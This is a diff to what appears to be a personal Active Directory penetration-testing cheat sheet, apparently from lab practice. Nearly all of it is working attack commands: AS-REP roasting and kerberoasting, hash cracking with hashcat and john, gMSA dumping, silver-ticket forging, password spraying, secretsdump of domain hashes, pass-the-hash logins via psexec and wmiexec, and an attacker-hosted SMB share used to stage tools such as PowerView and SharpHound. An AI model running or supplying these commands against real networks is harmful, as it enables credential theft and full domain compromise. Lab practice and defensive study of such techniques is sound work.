@@ -227,11 +227,28 @@ Crack Users that dont require creds to request TGT from the KDC (likely a Servic
 Requires port 88 (kerberos) and usernames to try AS-REP Roasting 
 
 impacket-GetNPUsers mike.com/ -no-pass -usersfile users.txt
-for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done 
+for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 192.168.200.5 mike.com/${user} | grep -v Impacket; done 
 
 hashcat -m 18200 hash.kerb $rockyou --force 
 john --wordlist=$rockyou asrephash.txt
-evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice 
+evil-winrm -i 10.10.10.161 -u svc-admin -p paxxword
+
+
+===================================
+TOOLS
+
+cd ~\tools\AD\
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py share `pwd` -smb2support -username mike -password paxx  
+net use \\192.168.49.124\share /USER:mike helps
+cd C:\Windows\Temp\
+cd C:\Users\Bob\Downloads\ 
+copy GetUserSPNs.py \\192.168.49.124\share\
+copy GetNPUsers.py \\192.168.49.124\share\
+copy Invoke-Kerberoast.ps1 \\192.168.49.124\share\
+copy getST.py \\192.168.49.124\share\
+copy gMSADumper.py \\192.168.49.124\share\
+copy SharpHound.ps1 \\192.168.49.124\share\
+copy PowerView.ps1 \\192.168.49.124\share\
 
 
 ===================================
@@ -245,12 +262,10 @@ GetUserSPNs.py -request domain/bob:pass -dc-ip 192.168.200.5 -outputfile kbroast
 
 ===================================
 GMSA User Crack 
-
 gMSADumper.py -u 'mike' -p paxxword -d mydom.htb    
   
 ===================================
 Silver Ticket 
-
 getST.py -spn www/dc.mike.com -impersonate Administrator domain/svc_gmsa$   
 
  
@@ -288,7 +303,7 @@ Export them in a format ready for cracking in both John the Ripper and Hashcat
 Completely eliminating the need for Mimikatz in this attack. 
 
 psexec administrator@192.168.200.5 -hashes aad3b4356:aad3b435
-smbup 
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py share `pwd` -smb2support -username mike -password paxx  
 copy \\192.168.119.154\share\Invoke-Kerberoast.ps1  
 powershell.exe -nop -exec bypass  
 Import-Module .\Invoke-Kerberoast.ps1  
@@ -316,7 +331,7 @@ Lookup Usernnames
 lookupsid.py mike.com/bob:"paxxword1\!"@192.168.200.5
 
 Check Samba Again
-crackmapexec smb 10.10.111.177 -u bob -p "paxx" -M spider_plus
+crackmapexec smb 192.168.200.5 -u bob -p "paxx" -M spider_plus
 
 Cred Test
 crackmapexec smb 192.168.200.5 -u jimmy -p "hacked"
@@ -328,7 +343,7 @@ kerbrute passwordspray --dc 192.168.200.5 -d mydomain users.txt 'Paxxword'
 crackmapexec smb 192.168.200.5 -u bob -p Paxxword --shares    
 
 All Hashes
-secretsdump mike.com/jimmy@192.168.200.5
+secretsdump mike.com/dcbob@192.168.200.5
 
 Finally
 wmiexec mike.com/administrator@192.168.200.5 -hashes abc123:abc123
@@ -426,6 +441,10 @@ Get-NetLoggedon -ComputerName client251
 Get-NetSession -ComputerName dc01   
 Invoke-Kerberoast  
 Invoke-BypassUAC  
+
+  
+==================================  
+Consider mxsam mxwinenum
 
 ==================================  
 PWN
